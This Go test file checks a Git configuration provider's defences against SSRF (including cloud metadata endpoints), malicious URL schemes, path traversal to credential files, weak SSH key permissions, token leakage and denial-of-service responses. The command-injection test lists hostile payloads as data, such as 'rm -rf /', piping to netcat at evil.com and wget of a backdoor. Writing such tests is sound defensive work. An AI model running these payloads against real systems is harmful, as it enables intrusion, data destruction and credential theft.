// security_test.go: Comprehensive Security Testing Suite for Argus Git Provider
//
// RED TEAM SECURITY ANALYSIS:
// This file implements systematic security testing against Git remote configuration provider,
// designed to identify and prevent common attack vectors in production environments.
//
// THREAT MODEL:
// - Malicious Git URLs (SSRF, injection attacks, credential exposure)
// - Git command injection and dangerous repository patterns
// - SSH key vulnerabilities and authentication bypass attempts
// - Resource exhaustion and DoS through large repository cloning
// - Path traversal attacks and file access control bypass
// - Authentication token exposure and credential leakage
// - Race conditions in concurrent Git operations
// - Provider state manipulation and resource leaks
//
// PHILOSOPHY:
// Each test is designed to be:
// - DRY (Don't Repeat Yourself) with reusable security utilities
// - SMART (Specific, Measurable, Achievable, Relevant, Time-bound)
// - COMPREHENSIVE covering all major attack vectors
// - WELL-DOCUMENTED explaining the security implications
//
// METHODOLOGY:
// 1. Identify attack surface and entry points in Git provider
// 2. Create targeted exploit scenarios for each vulnerability class
// 3. Test boundary conditions and edge cases specific to Git operations
// 4. Validate security controls and mitigations in provider
// 5. Document vulnerabilities and remediation steps
//
// Copyright (c) 2025 AGILira - A. Giordano
// Series: an AGLIra library
// SPDX-License-Identifier: MPL-2.0

package git

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/fs"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// =============================================================================
// SECURITY TESTING UTILITIES AND HELPERS
// =============================================================================

// SecurityTestContext provides utilities for security testing scenarios specific to Git provider.
// This centralizes common security testing patterns and reduces code duplication.
type SecurityTestContext struct {
	t                    *testing.T
	tempDir              string
	originalEnvVars      map[string]string
	mockGitServers       []*httptest.Server
	testSSHKeys          []string
	cleanupFunctions     []func()
	mu                   sync.Mutex
	memoryUsageBefore    uint64
	goroutineCountBefore int
}

// NewSecurityTestContext creates a new security testing context with automatic cleanup.
//
// SECURITY BENEFIT: Ensures test isolation and prevents test artifacts from
// affecting system security or other tests. Critical for reliable security testing.
func NewSecurityTestContext(t *testing.T) *SecurityTestContext {
	ctx := &SecurityTestContext{
		t:                    t,
		tempDir:              t.TempDir(),
		originalEnvVars:      make(map[string]string),
		mockGitServers:       make([]*httptest.Server, 0),
		testSSHKeys:          make([]string, 0),
		cleanupFunctions:     make([]func(), 0),
		goroutineCountBefore: runtime.NumGoroutine(),
	}

	// Capture initial memory usage for resource leak detection
	var memStats runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&memStats)
	ctx.memoryUsageBefore = memStats.Alloc

	// Register cleanup
	t.Cleanup(ctx.Cleanup)

	return ctx
}

// CreateMaliciousGitServer creates a mock Git server with malicious responses.
//
// SECURITY PURPOSE: Tests how the provider handles various malicious server behaviors,
// including oversized responses, connection hijacking, and protocol attacks.
func (ctx *SecurityTestContext) CreateMaliciousGitServer(behavior string) *httptest.Server {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch behavior {
		case "oversized_response":
			// Send extremely large response to test memory exhaustion
			w.Header().Set("Content-Type", "application/x-git-upload-pack-result")
			w.WriteHeader(http.StatusOK)
			largeData := strings.Repeat("malicious_git_data", 1024*1024) // 1MB+ of data
			_, _ = fmt.Fprintf(w, "%s", largeData)

		case "slow_response":
			// Simulate slowloris attack - send headers then delay
			w.Header().Set("Content-Type", "application/x-git-upload-pack-result")
			w.WriteHeader(http.StatusOK)
			time.Sleep(30 * time.Second) // Force timeout
			_, _ = fmt.Fprint(w, "slow_git_response")

		case "malformed_git_data":
			// Send malformed Git protocol data
			w.Header().Set("Content-Type", "application/x-git-upload-pack-result")
			w.WriteHeader(http.StatusOK)
			_, _ = fmt.Fprint(w, "INVALID_GIT_PROTOCOL_DATA\x00\xFF\xFE")

		case "redirect_to_localhost":
			// Try to redirect to localhost (SSRF attempt)
			w.Header().Set("Location", "http://127.0.0.1:22/")
			w.WriteHeader(http.StatusMovedPermanently)

		case "redirect_to_metadata":
			// Try to redirect to cloud metadata service
			w.Header().Set("Location", "http://169.254.169.254/latest/meta-data/")
			w.WriteHeader(http.StatusMovedPermanently)

		case "credential_echo":
			// Echo back credentials to test for leakage
			auth := r.Header.Get("Authorization")
			token := r.URL.Query().Get("token")
			_, _ = fmt.Fprintf(w, `{"auth":"%s","token":"%s","url":"%s"}`, auth, token, r.URL.String())

		case "connection_hijack":
			// Attempt to hijack the connection
			hijacker, ok := w.(http.Hijacker)
			if ok {
				conn, _, err := hijacker.Hijack()
				if err == nil {
					_, _ = conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHIJACKED_GIT_CONNECTION"))
					_ = conn.Close()
				}
			}

		case "path_traversal_response":
			// Try to serve files from outside intended directory
			requestedPath := r.URL.Query().Get("path")
			if strings.Contains(requestedPath, "..") {
				w.WriteHeader(http.StatusOK)
				_, _ = fmt.Fprintf(w, "SENSITIVE_FILE_CONTENT: %s", requestedPath)
			} else {
				w.WriteHeader(http.StatusNotFound)
			}

		default:
			// Normal behavior for baseline tests
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			_, _ = fmt.Fprint(w, `{"message": "normal_git_response"}`)
		}
	}))

	ctx.mockGitServers = append(ctx.mockGitServers, server)
	return server
}

// CreateInsecureSSHKey creates an SSH key with insecure permissions for testing.
//
// SECURITY PURPOSE: Tests SSH key permission validation and security controls.
func (ctx *SecurityTestContext) CreateInsecureSSHKey(permissions fs.FileMode) string {
	// Generate RSA private key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		ctx.t.Fatalf("Failed to generate SSH key: %v", err)
	}

	// Encode private key to PEM format
	privateKeyPEM := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	}

	// Create key file with specified permissions
	keyPath := filepath.Join(ctx.tempDir, fmt.Sprintf("test_key_%d", len(ctx.testSSHKeys)))
	keyFile, err := os.OpenFile(keyPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, permissions)
	if err != nil {
		ctx.t.Fatalf("Failed to create SSH key file: %v", err)
	}

	err = pem.Encode(keyFile, privateKeyPEM)
	_ = keyFile.Close()
	if err != nil {
		ctx.t.Fatalf("Failed to write SSH key: %v", err)
	}

	ctx.testSSHKeys = append(ctx.testSSHKeys, keyPath)
	return keyPath
}

// Cleanup performs comprehensive cleanup of test resources.
//
// SECURITY BENEFIT: Ensures no test artifacts remain that could affect system security
// or leak sensitive test data. Also validates resource management.
func (ctx *SecurityTestContext) Cleanup() {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	// Close mock servers
	for _, server := range ctx.mockGitServers {
		server.Close()
	}

	// Remove SSH keys
	for _, keyPath := range ctx.testSSHKeys {
		_ = os.Remove(keyPath)
	}

	// Execute custom cleanup functions
	for _, cleanup := range ctx.cleanupFunctions {
		cleanup()
	}

	// Restore environment variables
	for key, value := range ctx.originalEnvVars {
		if value == "" {
			_ = os.Unsetenv(key)
		} else {
			_ = os.Setenv(key, value)
		}
	}

	// Check for resource leaks
	runtime.GC()
	goroutineCountAfter := runtime.NumGoroutine()
	if goroutineCountAfter > ctx.goroutineCountBefore+2 { // Allow small tolerance
		ctx.t.Errorf("Potential goroutine leak detected: before=%d, after=%d",
			ctx.goroutineCountBefore, goroutineCountAfter)
	}

	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)
	memoryGrowth := memStats.Alloc - ctx.memoryUsageBefore
	if memoryGrowth > 10*1024*1024 { // 10MB tolerance
		ctx.t.Logf("Significant memory growth detected: %d bytes", memoryGrowth)
	}
}

// =============================================================================
// SSRF (SERVER-SIDE REQUEST FORGERY) PROTECTION TESTS
// =============================================================================

// TestSSRF_LocalhostProtection validates protection against localhost SSRF attacks.
//
// ATTACK SCENARIO: Attacker provides Git URLs pointing to localhost services
// to access internal services, configuration endpoints, or sensitive data.
//
// SECURITY CONTROL: Provider should block all localhost addresses and variations.
func TestSSRF_LocalhostProtection(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	localhostVariants := []string{
		"git://127.0.0.1/test/repo.git#config.json",
		"git://localhost/test/repo.git#config.json",
		"git://0.0.0.0/test/repo.git#config.json",
		"git://[::1]/test/repo.git#config.json",           // IPv6 localhost
		"git://0177.0.0.1/test/repo.git#config.json",      // Octal encoding
		"git://2130706433/test/repo.git#config.json",      // Decimal encoding
		"git://0x7f000001/test/repo.git#config.json",      // Hex encoding
		"git://127.000.000.001/test/repo.git#config.json", // Zero padding
	}

	for _, testURL := range localhostVariants {
		t.Run(fmt.Sprintf("Block_%s", testURL), func(t *testing.T) {
			err := provider.Validate(testURL)
			if err == nil {
				t.Errorf("Expected error for localhost URL %s, but got none", testURL)
				return
			}
			if !strings.Contains(err.Error(), "ARGUS_SECURITY_ERROR") {
				t.Errorf("Expected ARGUS_SECURITY_ERROR for %s, got: %v", testURL, err)
			}
		})
	}
}

// TestSSRF_PrivateNetworkProtection validates protection against private network SSRF.
//
// ATTACK SCENARIO: Attacker provides Git URLs pointing to private network ranges
// to access internal infrastructure, databases, or admin interfaces.
//
// SECURITY CONTROL: Provider should block all private network ranges per RFC 1918.
func TestSSRF_PrivateNetworkProtection(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	privateNetworks := []string{
		"git://10.0.0.1/test/repo.git#config.json",        // Private class A
		"git://172.16.0.1/test/repo.git#config.json",      // Private class B
		"git://192.168.1.1/test/repo.git#config.json",     // Private class C
		"git://169.254.1.1/test/repo.git#config.json",     // Link-local
		"git://224.0.0.1/test/repo.git#config.json",       // Multicast
		"git://255.255.255.255/test/repo.git#config.json", // Broadcast
	}

	for _, testURL := range privateNetworks {
		t.Run(fmt.Sprintf("Block_%s", testURL), func(t *testing.T) {
			// Use short timeout for security tests
			ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
			defer cancel()

			_, err := provider.Load(ctx, testURL)
			if err == nil {
				t.Errorf("Expected error for private network URL %s, but got none", testURL)
			}
			// Accept security error, retry exhausted, or timeout (all indicate blocking worked)
			if !strings.Contains(err.Error(), "ARGUS_SECURITY_ERROR") &&
				!strings.Contains(err.Error(), "ARGUS_RETRY_EXHAUSTED") &&
				!strings.Contains(err.Error(), "timeout") &&
				!strings.Contains(err.Error(), "context deadline exceeded") {
				t.Errorf("Expected security-related error for %s, got: %v", testURL, err)
			}
		})
	}
}

// TestSSRF_MetadataServerProtection validates protection against cloud metadata SSRF.
//
// ATTACK SCENARIO: Attacker provides Git URLs pointing to cloud metadata services
// to steal AWS/GCP/Azure credentials and sensitive instance information.
//
// SECURITY CONTROL: Provider should block 169.254.169.254 and other metadata endpoints.
func TestSSRF_MetadataServerProtection(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	metadataEndpoints := []string{
		"git://169.254.169.254/test/repo.git#config.json",          // AWS/Azure metadata
		"git://metadata.google.internal/test/repo.git#config.json", // GCP metadata
		"git://100.100.100.200/test/repo.git#config.json",          // Alibaba Cloud
	}

	for _, testURL := range metadataEndpoints {
		t.Run(fmt.Sprintf("Block_%s", testURL), func(t *testing.T) {
			err := provider.Validate(testURL)
			if err == nil {
				t.Errorf("Expected error for metadata URL %s, but got none", testURL)
			}
			if !strings.Contains(err.Error(), "ARGUS_SECURITY_ERROR") {
				t.Errorf("Expected ARGUS_SECURITY_ERROR for %s, got: %v", testURL, err)
			}
		})
	}
}

// =============================================================================
// GIT URL INJECTION ATTACK TESTS
// =============================================================================

// TestGitURLInjection_MaliciousSchemes validates protection against malicious URL schemes.
//
// ATTACK SCENARIO: Attacker provides URLs with dangerous schemes to execute commands
// or access files outside the Git protocol.
//
// SECURITY CONTROL: Provider should only accept 'git://' scheme and reject all others.
func TestGitURLInjection_MaliciousSchemes(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	maliciousSchemes := []string{
		"file:///etc/passwd#config.json",
		"ftp://evil.com/repo.git#config.json",
		"ldap://evil.com/repo.git#config.json",
		"javascript:alert('xss')#config.json",
		"data:text/plain;base64,malicious#config.json",
	}

	for _, testURL := range maliciousSchemes {
		t.Run(fmt.Sprintf("Block_%s", testURL), func(t *testing.T) {
			err := provider.Validate(testURL)
			if err == nil {
				t.Errorf("Expected error for malicious scheme %s, but got none", testURL)
			}
			if !strings.Contains(err.Error(), "ARGUS_INVALID_CONFIG") {
				t.Errorf("Expected ARGUS_INVALID_CONFIG for %s, got: %v", testURL, err)
			}
		})
	}
}

// TestGitURLInjection_CommandInjection validates protection against command injection.
//
// ATTACK SCENARIO: Attacker embeds shell commands in Git URLs to execute arbitrary
// commands on the server during Git operations.
//
// SECURITY CONTROL: Provider should sanitize all URL components and reject malicious patterns.
func TestGitURLInjection_CommandInjection(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	injectionPayloads := []string{
		"git://github.com/user/repo.git;rm -rf /#config.json",
		"git://github.com/user/repo.git`whoami`#config.json",
		"git://github.com/user/repo.git$(id)#config.json",
		"git://github.com/user/repo.git|nc evil.com 1337#config.json",
		"git://github.com/user/repo.git&wget evil.com/backdoor#config.json",
		"git://github.com/user/repo.git%00rm%20-rf%20/#config.json", // Null byte injection
	}

	for _, testURL := range injectionPayloads {
		t.Run(fmt.Sprintf("Block_%s", url.QueryEscape(testURL)), func(t *testing.T) {
			err := provider.Validate(testURL)
			if err == nil {
				t.Errorf("Expected error for injection payload %s, but got none", testURL)
			}
			// Should fail at URL parsing or validation level
			expectedErrors := []string{"ARGUS_INVALID_CONFIG", "ARGUS_SECURITY_ERROR"}
			foundError := false
			for _, expectedErr := range expectedErrors {
				if strings.Contains(err.Error(), expectedErr) {
					foundError = true
					break
				}
			}
			if !foundError {
				t.Errorf("Expected security-related error for %s, got: %v", testURL, err)
			}
		})
	}
}

// =============================================================================
// PATH TRAVERSAL ATTACK TESTS
// =============================================================================

// TestPathTraversal_DirectoryTraversal validates protection against directory traversal.
//
// ATTACK SCENARIO: Attacker uses path traversal sequences in configuration file paths
// to access files outside the intended repository directory.
//
// SECURITY CONTROL: Provider should validate and sanitize all file paths.
func TestPathTraversal_DirectoryTraversal(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	traversalPaths := []string{
		"git://github.com/user/repo.git#../../../etc/passwd.json",
		"git://github.com/user/repo.git#..\\..\\..\\windows\\system32\\config\\sam.json", // Windows
		"git://github.com/user/repo.git#....//....//....//etc//passwd.json",              // Double encoding
		"git://github.com/user/repo.git#%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd.json",    // URL encoded
		"git://github.com/user/repo.git#..%252f..%252f..%252fetc%252fpasswd.json",        // Double URL encoded
		"git://github.com/user/repo.git#.%00./.%00./etc/passwd.json",                     // Null byte injection
	}

	for _, testURL := range traversalPaths {
		t.Run(fmt.Sprintf("Block_%s", url.QueryEscape(testURL)), func(t *testing.T) {
			err := provider.Validate(testURL)
			if err == nil {
				t.Errorf("Expected error for path traversal %s, but got none", testURL)
			}
			if !strings.Contains(err.Error(), "ARGUS_SECURITY_ERROR") {
				t.Errorf("Expected ARGUS_SECURITY_ERROR for %s, got: %v", testURL, err)
			}
		})
	}
}

// TestPathTraversal_AbsolutePaths validates protection against absolute path access.
//
// ATTACK SCENARIO: Attacker provides absolute file paths to access sensitive system
// files instead of configuration files within the repository.
//
// SECURITY CONTROL: Provider should reject absolute paths and only allow relative paths.
func TestPathTraversal_AbsolutePaths(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	absolutePaths := []string{
		"git://github.com/user/repo.git#/etc/passwd",
		"git://github.com/user/repo.git#/proc/version",
		"git://github.com/user/repo.git#/root/.ssh/id_rsa",
		"git://github.com/user/repo.git#C:\\Windows\\System32\\config\\SAM", // Windows
		"git://github.com/user/repo.git#/var/log/auth.log",
		"git://github.com/user/repo.git#/home/user/.bash_history",
	}

	for _, testURL := range absolutePaths {
		t.Run(fmt.Sprintf("Block_%s", testURL), func(t *testing.T) {
			err := provider.Validate(testURL)
			if err == nil {
				t.Errorf("Expected error for absolute path %s, but got none", testURL)
			}
			if !strings.Contains(err.Error(), "ARGUS_SECURITY_ERROR") {
				t.Errorf("Expected ARGUS_SECURITY_ERROR for %s, got: %v", testURL, err)
			}
		})
	}
}

// =============================================================================
// SSH KEY SECURITY TESTS
// =============================================================================

// TestSSHKeySecurity_WeakPermissions validates SSH key file permission checking.
//
// ATTACK SCENARIO: SSH keys with overly permissive file permissions can be read
// by unauthorized users, leading to credential theft.
//
// SECURITY CONTROL: Provider should reject SSH keys that don't have secure permissions (0600).
func TestSSHKeySecurity_WeakPermissions(t *testing.T) {
	ctx := NewSecurityTestContext(t)
	provider := GetProvider()

	// Test various insecure permission combinations
	insecurePermissions := []fs.FileMode{
		0644, // World readable
		0664, // Group and world readable
		0666, // Everyone read/write
		0777, // Everyone everything
		0604, // World readable, no execute
		0640, // Group readable
	}

	for _, perm := range insecurePermissions {
		t.Run(fmt.Sprintf("Reject_%o", perm), func(t *testing.T) {
			keyPath := ctx.CreateInsecureSSHKey(perm)
			testURL := fmt.Sprintf("git://github.com/user/repo.git#config.json?ssh_key=%s", keyPath)

			err := provider.Validate(testURL)
			if err == nil {
				t.Errorf("Expected error for SSH key with permissions %o, but got none", perm)
			}
			if !strings.Contains(err.Error(), "ARGUS_SECURITY_ERROR") {
				t.Errorf("Expected ARGUS_SECURITY_ERROR for permissions %o, got: %v", perm, err)
			}
		})
	}
}

// TestSSHKeySecurity_NonexistentKey validates handling of nonexistent SSH key files.
//
// ATTACK SCENARIO: Attacker provides paths to nonexistent SSH keys to cause errors
// or potentially access files that shouldn't be treated as SSH keys.
//
// SECURITY CONTROL: Provider should fail gracefully with appropriate error messages.
func TestSSHKeySecurity_NonexistentKey(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	nonexistentKeys := []string{
		"/nonexistent/path/to/key",
		"/dev/null",
		"/nonexistent/system/file", // File that doesn't exist
		"",                         // Empty path
		"relative/path/to/nonexistent/key",
	}

	for _, keyPath := range nonexistentKeys {
		t.Run(fmt.Sprintf("Handle_%s", strings.ReplaceAll(keyPath, "/", "_")), func(t *testing.T) {
			testURL := fmt.Sprintf("git://github.com/user/repo.git#config.json?ssh_key=%s",
				url.QueryEscape(keyPath))

			err := provider.Validate(testURL)
			if err == nil {
				t.Errorf("Expected error for nonexistent SSH key %s, but got none", keyPath)
			}
			// Should be IO error or security error
			expectedErrors := []string{"ARGUS_IO_ERROR", "ARGUS_SECURITY_ERROR", "ARGUS_AUTH_ERROR"}
			foundError := false
			for _, expectedErr := range expectedErrors {
				if strings.Contains(err.Error(), expectedErr) {
					foundError = true
					break
				}
			}
			if !foundError {
				t.Errorf("Expected appropriate error type for %s, got: %v", keyPath, err)
			}
		})
	}
}

// =============================================================================
// AUTHENTICATION BYPASS TESTS
// =============================================================================

// TestAuthenticationBypass_TokenExtraction validates protection against token extraction.
//
// ATTACK SCENARIO: Attacker tries various methods to extract or expose authentication
// tokens through error messages, logs, or reflected responses.
//
// SECURITY CONTROL: Provider should never expose tokens in error messages or logs.
func TestAuthenticationBypass_TokenExtraction(t *testing.T) {
	ctx := NewSecurityTestContext(t)
	provider := GetProvider()

	// Create server that echoes credentials back
	server := ctx.CreateMaliciousGitServer("credential_echo")
	defer server.Close()

	// Extract host from server URL
	serverURL, _ := url.Parse(server.URL)
	testURL := fmt.Sprintf("git://%s/user/repo.git#config.json?token=ghp_sensitive_token_12345",
		serverURL.Host)

	err := provider.Validate(testURL)

	// Even if there's an error, it should not contain the token
	if err != nil && strings.Contains(err.Error(), "ghp_sensitive_token_12345") {
		t.Errorf("Authentication token leaked in error message: %v", err)
	}
}

// TestAuthenticationBypass_CredentialLeakage validates protection against credential leakage.
//
// ATTACK SCENARIO: Attacker monitors logs, error messages, or debug output to extract
// authentication credentials from the provider.
//
// SECURITY CONTROL: Provider should sanitize all outputs and never log credentials.
func TestAuthenticationBypass_CredentialLeakage(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	credentialURLs := []string{
		"git://username:password@github.com/user/repo.git#config.json",
		"git://github.com/user/repo.git#config.json?token=glpat_secret_gitlab_token",
		"git://evil.com/repo.git#config.json?ssh_key=/sensitive/key/path",
	}

	for _, testURL := range credentialURLs {
		t.Run("NoCredentialLeak", func(t *testing.T) {
			err := provider.Validate(testURL)

			// Check that error doesn't contain sensitive parts
			if err != nil {
				errorStr := err.Error()
				sensitivePatterns := []string{
					"password",
					"glpat_secret_gitlab_token",
					"/sensitive/key/path",
				}

				for _, pattern := range sensitivePatterns {
					if strings.Contains(errorStr, pattern) {
						t.Errorf("Credential leaked in error for URL %s: %v",
							"[REDACTED]", err)
					}
				}
			}
		})
	}
}

// =============================================================================
// RESOURCE EXHAUSTION AND DOS TESTS
// =============================================================================

// TestResourceExhaustion_LargeRepository validates protection against large repository DoS.
//
// ATTACK SCENARIO: Attacker provides URLs to extremely large Git repositories to
// exhaust server memory, disk space, or network bandwidth.
//
// SECURITY CONTROL: Provider should implement repository size limits and timeouts.
func TestResourceExhaustion_LargeRepository(t *testing.T) {
	ctx := NewSecurityTestContext(t)
	provider := GetProvider()

	// Create server that sends oversized response
	server := ctx.CreateMaliciousGitServer("oversized_response")
	defer server.Close()

	serverURL, _ := url.Parse(server.URL)
	testURL := fmt.Sprintf("git://%s/user/largerepo.git#config.json", serverURL.Host)

	// Set short timeout to prevent test from running too long
	ctx_timeout, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := provider.Load(ctx_timeout, testURL)
	if err == nil {
		t.Error("Expected error for oversized repository response, but got none")
	}

	// Should timeout, return resource error, or be blocked for security reasons
	if !strings.Contains(err.Error(), "timeout") &&
		!strings.Contains(err.Error(), "ARGUS_IO_ERROR") &&
		!strings.Contains(err.Error(), "context deadline exceeded") &&
		!strings.Contains(err.Error(), "ARGUS_SECURITY_ERROR") {
		t.Errorf("Expected timeout or resource error, got: %v", err)
	}
}

// TestResourceExhaustion_SlowResponse validates protection against slowloris attacks.
//
// ATTACK SCENARIO: Attacker creates Git servers that respond very slowly to exhaust
// connection pools and hang the provider indefinitely.
//
// SECURITY CONTROL: Provider should implement appropriate timeouts for all operations.
func TestResourceExhaustion_SlowResponse(t *testing.T) {
	ctx := NewSecurityTestContext(t)
	provider := GetProvider()

	// Create server with intentionally slow response
	server := ctx.CreateMaliciousGitServer("slow_response")
	defer server.Close()

	serverURL, _ := url.Parse(server.URL)
	testURL := fmt.Sprintf("git://%s/user/repo.git#config.json", serverURL.Host)

	// Set reasonable timeout
	ctx_timeout, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	start := time.Now()
	_, err := provider.Load(ctx_timeout, testURL)
	elapsed := time.Since(start)

	if err == nil {
		t.Error("Expected timeout error for slow response, but got none")
	}

	// Should timeout within reasonable time
	if elapsed > 5*time.Second {
		t.Errorf("Operation took too long: %v", elapsed)
	}

	if !strings.Contains(err.Error(), "timeout") &&
		!strings.Contains(err.Error(), "context deadline exceeded") &&
		!strings.Contains(err.Error(), "ARGUS_SECURITY_ERROR") {
		t.Errorf("Expected timeout error, got: %v", err)
	}
}

// =============================================================================
// CONCURRENT ACCESS AND RACE CONDITION TESTS
// =============================================================================

// TestConcurrentAccess_RaceConditions validates thread safety under concurrent load.
//
// ATTACK SCENARIO: Attacker sends many concurrent requests to trigger race conditions
// in provider state management, potentially corrupting data or causing crashes.
//
// SECURITY CONTROL: Provider should handle concurrent access safely without race conditions.
func TestConcurrentAccess_RaceConditions(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	const numConcurrent = 50
	const numRequests = 10

	var wg sync.WaitGroup
	var errorCount int64
	var successCount int64

	// Create multiple workers making concurrent requests
	for i := 0; i < numConcurrent; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			for j := 0; j < numRequests; j++ {
				// Use invalid URL to test error handling under concurrency
				testURL := fmt.Sprintf("git://127.0.0.1/worker%d/repo%d.git#config.json", workerID, j)

				err := provider.Validate(testURL)
				if err != nil {
					atomic.AddInt64(&errorCount, 1)
				} else {
					atomic.AddInt64(&successCount, 1)
				}
			}
		}(i)
	}

	wg.Wait()

	// All should fail due to localhost protection
	expectedErrors := int64(numConcurrent * numRequests)
	if errorCount != expectedErrors {
		t.Errorf("Expected %d errors, got %d (successes: %d)", expectedErrors, errorCount, successCount)
	}

	// Check for race detector issues (would be caught by go test -race)
	t.Logf("Concurrent test completed: %d errors, %d successes", errorCount, successCount)
}

// TestConcurrentAccess_StateCorruption validates provider state integrity under load.
//
// ATTACK SCENARIO: Multiple threads accessing provider simultaneously could corrupt
// internal state, leading to security bypasses or crashes.
//
// SECURITY CONTROL: Provider should maintain consistent internal state under concurrent access.
func TestConcurrentAccess_StateCorruption(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	const numWorkers = 20
	var wg sync.WaitGroup

	// Create workers that access provider concurrently with different operations
	operations := []string{
		"https://127.0.0.1/test1/repo.git#config.json",       // Should be blocked
		"git://github.com/user/repo.git#../../../etc/passwd", // Path traversal
		"invalid://test#config.json",                         // Invalid scheme
		"git://10.0.0.1/test/repo.git#config.json",           // Private network
	}

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			for j := 0; j < len(operations); j++ {
				testURL := operations[j%len(operations)]

				err := provider.Validate(testURL)

				// All these operations should fail with security errors
				if err == nil {
					t.Errorf("Worker %d: Expected error for %s, but got none", workerID, testURL)
				}

				// Verify consistent error types
				if err != nil && !strings.Contains(err.Error(), "ARGUS_") {
					t.Errorf("Worker %d: Unexpected error format for %s: %v", workerID, testURL, err)
				}
			}
		}(i)
	}

	wg.Wait()
	t.Log("State corruption test completed successfully")
}

// =============================================================================
// MALFORMED DATA AND PARSER SECURITY TESTS
// =============================================================================

// TestMalformedData_ConfigurationParsing validates robust handling of malformed configs.
//
// ATTACK SCENARIO: Attacker provides malformed configuration files to trigger parser
// vulnerabilities, buffer overflows, or DoS conditions.
//
// SECURITY CONTROL: Provider should handle all malformed data gracefully without crashes.
func TestMalformedData_ConfigurationParsing(t *testing.T) {
	ctx := NewSecurityTestContext(t)
	provider := GetProvider()

	// Create server that returns malformed data
	server := ctx.CreateMaliciousGitServer("malformed_git_data")
	defer server.Close()

	serverURL, _ := url.Parse(server.URL)
	testURL := fmt.Sprintf("git://%s/user/repo.git#config.json", serverURL.Host)

	err := provider.Validate(testURL)
	if err == nil {
		t.Error("Expected error for malformed Git data, but got none")
	}

	// Should handle gracefully without panic or be blocked for security
	expectedErrors := []string{"ARGUS_IO_ERROR", "ARGUS_CONFIG_NOT_FOUND", "ARGUS_SECURITY_ERROR", "invalid"}
	foundError := false
	for _, expectedErr := range expectedErrors {
		if strings.Contains(err.Error(), expectedErr) {
			foundError = true
			break
		}
	}
	if !foundError {
		t.Errorf("Expected parsing error, got: %v", err)
	}
}

// =============================================================================
// URL VALIDATION COMPREHENSIVE TESTS
// =============================================================================

// TestURLValidation_ComprehensiveValidation validates all URL validation security controls.
//
// ATTACK SCENARIO: Comprehensive test of all URL-based attack vectors including
// malformed URLs, injection attempts, and bypass techniques.
//
// SECURITY CONTROL: Provider should validate all URL components thoroughly.
func TestURLValidation_ComprehensiveValidation(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	maliciousURLs := []struct {
		url           string
		description   string
		expectedError string
	}{
		{"", "Empty URL", "ARGUS_INVALID_CONFIG"},
		{"not-a-url", "Invalid URL format", "ARGUS_INVALID_CONFIG"},
		{"git://", "Incomplete URL", "ARGUS_INVALID_CONFIG"},
		{"git:///repo.git#config.json", "Missing host", "ARGUS_INVALID_CONFIG"},
		{"git://github.com#config.json", "Missing path", "ARGUS_INVALID_CONFIG"},
		{"git://github.com/user/repo.git", "Missing fragment", "ARGUS_INVALID_CONFIG"},
		{"git://github.com/user/repo.git#", "Empty fragment", "ARGUS_INVALID_CONFIG"},
		{"git://user:pass@127.0.0.1/repo.git#config.json", "Localhost with auth", "ARGUS_SECURITY_ERROR"},
		{"git://127.0.0.1:22/repo.git#config.json", "Localhost direct access", "ARGUS_SECURITY_ERROR"},
		{"git://github.com/user/repo.git#../../../etc/passwd", "Path traversal in fragment", "ARGUS_SECURITY_ERROR"},
	}

	for _, test := range maliciousURLs {
		t.Run(test.description, func(t *testing.T) {
			err := provider.Validate(test.url)
			if err == nil {
				t.Errorf("Expected error for %s (%s), but got none", test.description, test.url)
				return
			}
			if !strings.Contains(err.Error(), test.expectedError) {
				t.Errorf("Expected %s for %s, got: %v", test.expectedError, test.description, err)
			}
		})
	}
}

// =============================================================================
// SECURITY REGRESSION TESTS
// =============================================================================

// TestSecurityRegression_FixedVulnerabilities validates that previously fixed
// security vulnerabilities remain fixed and don't regress.
//
// SECURITY CONTROL: Ensures security fixes are permanent and comprehensive.
func TestSecurityRegression_FixedVulnerabilities(t *testing.T) {
	_ = NewSecurityTestContext(t)
	provider := GetProvider()

	// Test specific vulnerabilities that were discovered and fixed during development
	regressionTests := []struct {
		name              string
		url               string
		expectedErrorType string
		description       string
	}{
		{
			name:              "MetadataSSRF",
			url:               "git://169.254.169.254/test/repo.git#config.json",
			expectedErrorType: "ARGUS_SECURITY_ERROR",
			description:       "AWS/Azure metadata server SSRF attempt should be blocked",
		},
		{
			name:              "PathTraversalWithEncoding",
			url:               "git://github.com/user/repo.git#%2e%2e%2f%2e%2e%2fetc%2fpasswd.json",
